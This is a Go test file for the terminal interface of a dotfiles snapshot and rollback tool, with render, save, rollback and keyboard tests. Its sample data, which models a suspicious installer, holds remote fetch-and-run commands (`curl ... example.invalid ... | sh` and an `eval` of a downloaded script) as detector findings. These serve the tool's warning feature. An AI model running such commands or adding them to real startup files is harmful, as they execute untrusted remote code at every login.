package tui

import (
	"errors"
	"flag"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/iYeremy/dotka/internal/doctor"
	"github.com/iYeremy/dotka/internal/gen"
	"github.com/iYeremy/dotka/internal/scan"
)

var update = flag.Bool("update", false, "rewrite golden files in testdata/")

// ---- fake backend ----------------------------------------------------------------

type fakeBackend struct {
	data     *Data
	snaps    []string
	rollback []int
	forgets  []int
	inits    int
	loadErr  error
}

func (f *fakeBackend) Load() (*Data, error) { return f.data, f.loadErr }
func (f *fakeBackend) Patch(c gen.Change) []string {
	return []string{"--- saved", "+++ now", "@@ -1,3 +1,4 @@", ` hl.on("hyprland.start", function()`,
		`-    hl.exec_cmd("qs -p ~/.config/quickshell/bar/shell.qml")`, `+    hl.exec_cmd("waybar")`, `+    hl.exec_cmd("swww-daemon")`, ` end)`}
}
func (f *fakeBackend) Snap(msg string) (string, error) {
	f.snaps = append(f.snaps, msg)
	return "Saved as save point #4.", nil
}
func (f *fakeBackend) Init() (string, error) { f.inits++; return "ready", nil }
func (f *fakeBackend) Preview(id int) (gen.Plan, gen.ExtraDiff, error) {
	p := gen.Plan{Target: gen.Generation{ID: id, Message: "initial state"}, Actions: []gen.Action{
		{Kind: gen.ActWrite, Path: ".config/hypr/hyprland.lua"}, {Kind: gen.ActRemove, Path: ".config/waybar/config.jsonc"},
		{Kind: gen.ActRmdir, Path: ".config/waybar"}}}
	return p, gen.ExtraDiff{PkgRemoved: []string{"waybar", "swww"}, StartupRemoved: []gen.StartupItem{{Command: "waybar"}}}, nil
}
func (f *fakeBackend) Rollback(id int) (string, error) {
	f.rollback = append(f.rollback, id)
	return "Went back.", nil
}
func (f *fakeBackend) Forget(id int) (string, error) {
	f.forgets = append(f.forgets, id)
	return "Forgot.", nil
}

var t0 = time.Date(2026, 11, 14, 19, 46, 0, 0, time.Local)

func entry(p, typ string) scan.Entry {
	return scan.Entry{Path: p, Type: typ, Mode: 0o644, Stored: true}
}

// sampleData mirrors the sandbox scenario: a fake installer was run.
func sampleData() *Data {
	files := []scan.Entry{entry(".config", scan.TypeDir), entry(".config/hypr/hyprland.lua", scan.TypeFile), entry(".zshrc", scan.TypeFile)}
	g1 := gen.Generation{ID: 1, Message: "initial state", Origin: gen.OriginInit, CreatedAt: t0, Roots: []string{".config", ".zshrc"}, Entries: files,
		Extra: gen.Extra{Packages: &gen.Packages{Explicit: []string{"hyprland", "kitty"}}}}
	g2 := g1
	g2.ID, g2.Message, g2.Origin, g2.Parent, g2.CreatedAt = 2, "super-rice", gen.OriginRun, 1, t0.Add(10*time.Minute)
	g2.Run = &gen.RunInfo{Command: []string{"./super-rice/install.sh"}, Dir: "/x"}
	g3 := g1
	g3.ID, g3.Message, g3.Origin, g3.Parent, g3.CreatedAt = 3, "before rollback to #1", gen.OriginPreRollback, 2, t0.Add(20*time.Minute)

	modOld, modNew := entry(".config/hypr/hyprland.lua", scan.TypeFile), entry(".config/hypr/hyprland.lua", scan.TypeFile)
	modNew.Hash = "x"
	kOld := entry(".config/kitty/kitty.conf", scan.TypeFile)
	kNew := scan.Entry{Path: ".config/kitty/kitty.conf", Type: scan.TypeSymlink, Target: "/home/u/dots/kitty.conf"}
	wDir, wA, wB := entry(".config/waybar", scan.TypeDir), entry(".config/waybar/config.jsonc", scan.TypeFile), entry(".config/waybar/style.css", scan.TypeFile)
	bin := entry(".local/bin/rice-autoupdate.sh", scan.TypeFile)
	remote := gen.StartupItem{Kind: "shell-remote", Command: `eval "$(curl -fsSL https://example.invalid/prompt.sh)"`, Source: ".zshrc", Line: 4, Confidence: "heuristic", Risk: "remote-exec"}
	wb := gen.StartupItem{Kind: "hypr-autostart", Command: "waybar", Source: ".config/hypr/hyprland.lua", Line: 3, Confidence: "confirmed"}
	upd := gen.StartupItem{Kind: "hypr-autostart", Command: "~/.local/bin/rice-autoupdate.sh", Source: ".config/hypr/hyprland.lua", Line: 6, Confidence: "confirmed", Risk: "local-script"}
	qs := gen.StartupItem{Kind: "hypr-autostart", Command: "qs -p ~/.config/quickshell/bar/shell.qml", Source: ".config/hypr/hyprland.lua", Line: 5, Confidence: "confirmed"}
	svc := gen.StartupItem{Kind: "systemd-user", Command: "rice-sync.service: %h/.local/bin/rice-autoupdate.sh --daemon", Source: ".config/systemd/user/default.target.wants/rice-sync.service (default.target)", Confidence: "confirmed", Risk: "local-script"}

	return &Data{
		Home: "/home/u/proyectos/Dotka/.sandbox/home", Sandbox: true, Initialized: true,
		Head: g1, Gens: []gen.Generation{g3, g2, g1},
		Changes: []gen.Change{
			{Path: ".config/hypr/hyprland.lua", Kind: gen.Modified, Old: &modOld, New: &modNew},
			{Path: ".config/kitty/kitty.conf", Kind: gen.TypeChg, Old: &kOld, New: &kNew},
			{Path: ".config/waybar", Kind: gen.Added, New: &wDir},
			{Path: ".config/waybar/config.jsonc", Kind: gen.Added, New: &wA},
			{Path: ".config/waybar/style.css", Kind: gen.Added, New: &wB},
			{Path: ".local/bin/rice-autoupdate.sh", Kind: gen.Added, New: &bin},
		},
		Extra: gen.ExtraDiff{
			PkgAdded: []string{"cava", "swww", "waybar"}, ForeignAdded: []string{"cava"},
			StartupAdded: []gen.StartupItem{wb, upd, remote}, StartupRemoved: []gen.StartupItem{qs},
		},
		Startup: []gen.StartupItem{wb, upd, {Kind: "hypr-autostart", Command: "dunst", Source: ".config/hypr/hyprland.lua", Line: 5, Confidence: "confirmed"}, svc, remote},
		Findings: []doctor.Finding{
			{Severity: doctor.Problem, Check: "startup-script-remote", Path: ".local/bin/rice-autoupdate.sh", Line: 2,
				Message: "downloads and runs code at every login (started from .config/hypr/hyprland.lua:6): curl -fsSL https://example.invalid/update.sh | sh",
				Hint:    "read the script; remove it from startup if you do not trust the source"},
			{Severity: doctor.Problem, Check: "missing-program", Path: ".config/hypr/hyprland.lua", Line: 4,
				Message: `starts "swww-daemon", but that program is not installed`, Hint: "install it, or remove the line if you no longer use it"},
			{Severity: doctor.Problem, Check: "exposed-secret", Path: ".config/gh/hosts.yml",
				Message: "looks like a secret (known credentials file) but is readable by other users (mode 644)", Hint: "chmod 600 ~/.config/gh/hosts.yml"},
			{Severity: doctor.Note, Check: "leftover-config", Path: ".config/vesktop",
				Message: "no installed program or package matches this config (left over from an uninstalled app?)", Hint: "if you no longer use it, it can be removed (heuristic: double-check first)"},
		},
	}
}

// ---- helpers ----------------------------------------------------------------------

func send(m Model, msgs ...tea.Msg) Model {
	for _, msg := range msgs {
		nm, cmd := m.Update(msg)
		m = nm.(Model)
		// Run synchronous commands (they are fast fakes) and feed results back.
		for cmd != nil {
			out := cmd()
			if out == nil {
				break
			}
			if _, isQuit := out.(tea.QuitMsg); isQuit {
				break
			}
			nm, cmd = m.Update(out)
			m = nm.(Model)
		}
	}
	return m
}

func keys(s ...string) []tea.Msg {
	var out []tea.Msg
	for _, k := range s {
		switch k {
		case "enter":
			out = append(out, tea.KeyMsg{Type: tea.KeyEnter})
		case "esc":
			out = append(out, tea.KeyMsg{Type: tea.KeyEsc})
		case "tab":
			out = append(out, tea.KeyMsg{Type: tea.KeyTab})
		case "down":
			out = append(out, tea.KeyMsg{Type: tea.KeyDown})
		case "backspace":
			out = append(out, tea.KeyMsg{Type: tea.KeyBackspace})
		default:
			out = append(out, tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune(k)})
		}
	}
	return out
}

func loaded(t *testing.T, w, h int) (Model, *fakeBackend) {
	t.Helper()
	be := &fakeBackend{data: sampleData()}
	m := send(New(be), tea.WindowSizeMsg{Width: w, Height: h}, loadedMsg{data: be.data})
	return m, be
}

func checkFrame(t *testing.T, name, frame string, w, h int) {
	t.Helper()
	lines := strings.Split(frame, "\n")
	if len(lines) != h {
		t.Errorf("%s: %d lines, want %d", name, len(lines), h)
	}
	for i, l := range lines {
		if got := len([]rune(l)); got > w {
			t.Errorf("%s: line %d is %d cells wide, max %d: %q", name, i, got, w, l)
		}
		for _, r := range l {
			if r > 0x7f {
				t.Fatalf("%s: non-ASCII rune %q on line %d", name, r, i)
			}
		}
	}
}

func golden(t *testing.T, name, frame string) {
	t.Helper()
	p := filepath.Join("testdata", name+".txt")
	if *update {
		os.MkdirAll("testdata", 0o755)
		if err := os.WriteFile(p, []byte(frame+"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		return
	}
	want, err := os.ReadFile(p)
	if err != nil {
		t.Fatalf("missing golden %s (run: go test ./internal/tui -update)", p)
	}
	if string(want) != frame+"\n" {
		t.Errorf("%s differs from golden; run with -update if the change is intended\n--- got ---\n%s", name, frame)
	}
}

// ---- render tests --------------------------------------------------------------------

func TestScreensRenderAtManySizes(t *testing.T) {
	sizes := [][2]int{{70, 20}, {80, 24}, {120, 40}, {200, 60}}
	for _, sz := range sizes {
		m, _ := loaded(t, sz[0], sz[1])
		for tb := tab(0); tb < numTabs; tb++ {
			m = send(m, keys(string(rune('1'+tb)))...)
			checkFrame(t, m.tabName()+"@"+sizeName(sz), m.View(), sz[0], sz[1])
			m = send(m, keys("tab")...) // detail focus
			checkFrame(t, m.tabName()+"-detail@"+sizeName(sz), m.View(), sz[0], sz[1])
			m = send(m, keys("esc")...)
		}
		for _, mo := range []string{"?", "s"} {
			mm := send(m, keys("1", mo)...)
			checkFrame(t, "modal "+mo, mm.View(), sz[0], sz[1])
		}
		mm := send(m, keys("1", "u")...)
		checkFrame(t, "rollback modal", mm.View(), sz[0], sz[1])
	}
}

func (m Model) tabName() string {
	return [numTabs]string{"overview", "changes", "history", "startup", "health"}[m.tab]
}

func sizeName(s [2]int) string { return string(rune('0'+s[0]/100)) + "xx" }

func TestGoldenFrames80x24(t *testing.T) {
	m, _ := loaded(t, 80, 24)
	golden(t, "overview", send(m, keys("1")...).View())
	golden(t, "changes", send(m, keys("2")...).View())
	golden(t, "changes-startup", send(m, keys("2", "G")...).View())
	golden(t, "history", send(m, keys("3", "j")...).View())
	golden(t, "startup", send(m, keys("4", "j")...).View())
	golden(t, "health", send(m, keys("5")...).View())
	golden(t, "rollback", send(m, keys("1", "u")...).View())
	golden(t, "save", send(m, keys("s", "b", "e", "f", "o", "r", "e")...).View())
	golden(t, "help", send(m, keys("?")...).View())
	small := send(m, tea.WindowSizeMsg{Width: 50, Height: 15}).View()
	checkFrame(t, "toosmall", small, 50, 15)
	golden(t, "toosmall", small)

	be := &fakeBackend{data: &Data{Home: "/home/u", StoreDir: "/home/u/.local/share/dotka", Startup: sampleData().Startup, Findings: sampleData().Findings}}
	fr := send(New(be), tea.WindowSizeMsg{Width: 80, Height: 24}, loadedMsg{data: be.data})
	golden(t, "first-run", fr.View())
	golden(t, "setup", send(fr, keys("i")...).View())
}

func TestTooSmallAndLoadingAndError(t *testing.T) {
	m := send(New(&fakeBackend{}), tea.WindowSizeMsg{Width: 40, Height: 10})
	if !strings.Contains(m.View(), "Terminal too small") {
		t.Error("missing too-small message")
	}
	m = send(m, tea.WindowSizeMsg{Width: 80, Height: 24})
	if !strings.Contains(m.View(), "Scanning your home") {
		t.Error("missing loading state")
	}
	m = send(m, loadedMsg{err: errors.New("boom")})
	if v := m.View(); !strings.Contains(v, "Could not read") || !strings.Contains(v, "boom") {
		t.Error("missing error state")
	}
}

// ---- interaction tests ---------------------------------------------------------------

func TestCursorSkipsHeaders(t *testing.T) {
	m, _ := loaded(t, 80, 24)
	m = send(m, keys("2")...)
	if r := m.selected(); r == nil || r.change == nil || r.change.Path != ".config/hypr/hyprland.lua" {
		t.Fatalf("first selectable row should be the first file, got %+v", r)
	}
	// Move past the last file into the Packages section (header skipped).
	m = send(m, keys("j", "j", "j", "j")...)
	if r := m.selected(); r == nil || r.pkg != "cava" {
		t.Fatalf("expected package cava after the files, got %+v", r)
	}
}

func TestSaveFlow(t *testing.T) {
	m, be := loaded(t, 80, 24)
	m = send(m, keys("s", "x", "y", "backspace", "esc")...)
	if len(be.snaps) != 0 || m.modal != modalNone {
		t.Fatal("esc must cancel without saving")
	}
	m = send(m, keys("s", "q", " ", "r")...) // q is text inside the input, not quit
	m = send(m, keys("enter")...)
	if len(be.snaps) != 1 || be.snaps[0] != "q r" {
		t.Fatalf("snaps = %q", be.snaps)
	}
	if !strings.Contains(m.status, "Saved") {
		t.Errorf("status = %q", m.status)
	}
}

func TestRollbackNeedsConfirmation(t *testing.T) {
	m, be := loaded(t, 80, 24)
	m = send(m, keys("u")...)
	if m.modal != modalRollback || !strings.Contains(m.View(), "sudo pacman -Rns waybar swww") {
		t.Fatal("u must open the rollback plan with package hints")
	}
	m = send(m, keys("n")...)
	if len(be.rollback) != 0 || !strings.Contains(m.status, "Cancelled") {
		t.Fatal("n must cancel")
	}
	m = send(m, keys("3", "j", "j", "b", "y")...) // History: select #1, go back
	if len(be.rollback) != 1 || be.rollback[0] != 1 {
		t.Fatalf("rollback calls = %v", be.rollback)
	}
}

func TestForgetRulesAndConfirm(t *testing.T) {
	m, be := loaded(t, 80, 24)
	m = send(m, keys("3", "j", "j", "x")...) // #1 is the current one
	if m.modal != modalNone || !strings.Contains(m.status, "cannot be forgotten") {
		t.Fatalf("forgetting the current save point must be refused: %q", m.status)
	}
	m = send(m, keys("k", "x", "y")...) // #2
	if len(be.forgets) != 1 || be.forgets[0] != 2 {
		t.Fatalf("forgets = %v", be.forgets)
	}
}

func TestSetupShowsBetaNoticeAndNeedsConfirmation(t *testing.T) {
	be := &fakeBackend{data: &Data{Home: "/home/u", StoreDir: "/home/u/.local/share/dotka"}}
	m := send(New(be), tea.WindowSizeMsg{Width: 80, Height: 24}, loadedMsg{data: be.data})
	// Without setup, save/discard explain what to do instead of failing.
	m = send(m, keys("s")...)
	if m.modal != modalNone || !strings.Contains(m.status, "press i") {
		t.Fatalf("s before setup: modal=%v status=%q", m.modal, m.status)
	}
	m = send(m, keys("i")...)
	v := m.View()
	if m.modal != modalInit || !strings.Contains(v, "beta") || !strings.Contains(v, "/home/u/.local/share/dotka") {
		t.Fatalf("i must show the beta notice with the store path:\n%s", v)
	}
	m = send(m, keys("n")...)
	if be.inits != 0 {
		t.Fatal("n must not set up")
	}
	send(m, keys("i", "y")...)
	if be.inits != 1 {
		t.Fatal("y must set up")
	}
}

// Terminals report Esc followed quickly by a key as Alt+key; the key must
// not be lost (found in a real PTY test: Esc then 3 did not open History).
func TestEscThenKeyArrivingAsAlt(t *testing.T) {
	m, _ := loaded(t, 80, 24)
	m = send(m, keys("2", "tab")...)
	m = send(m, tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune("3"), Alt: true})
	if m.tab != tabHistory || m.focusDetail {
		t.Fatalf("alt+3 should act as esc then 3: tab=%v focusDetail=%v", m.tab, m.focusDetail)
	}
	m = send(m, keys("s")...)
	m = send(m, tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune("1"), Alt: true})
	if m.modal != modalNone || m.tab != tabOverview || len(m.input) != 0 {
		t.Fatal("alt+1 in the save dialog should cancel it (esc) and then switch tab, not type")
	}
}

func TestQuitAndHelp(t *testing.T) {
	m, _ := loaded(t, 80, 24)
	m = send(m, keys("?")...)
	if m.modal != modalHelp {
		t.Fatal("? opens help")
	}
	m = send(m, keys("j")...)
	if m.modal != modalNone {
		t.Fatal("any key closes help")
	}
	_, cmd := m.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune("q")})
	if cmd == nil {
		t.Fatal("q must quit")
	}
	if _, ok := cmd().(tea.QuitMsg); !ok {
		t.Fatal("q must return tea.Quit")
	}
}

func TestListScrollsAndKeepsCursorVisible(t *testing.T) {
	be := &fakeBackend{data: sampleData()}
	for i := 0; i < 60; i++ {
		be.data.Startup = append(be.data.Startup, gen.StartupItem{Kind: "shell-source", Command: "source ~/f" + string(rune('a'+i%26)), Source: ".zshrc", Line: i})
	}
	m := send(New(be), tea.WindowSizeMsg{Width: 80, Height: 24}, loadedMsg{data: be.data})
	m = send(m, keys("4", "G")...)
	v := m.View()
	if !strings.Contains(v, "> ") || !strings.Contains(v, "more above") {
		t.Errorf("cursor not visible after G or missing indicator:\n%s", v)
	}
	checkFrame(t, "scrolled", v, 80, 24)
}
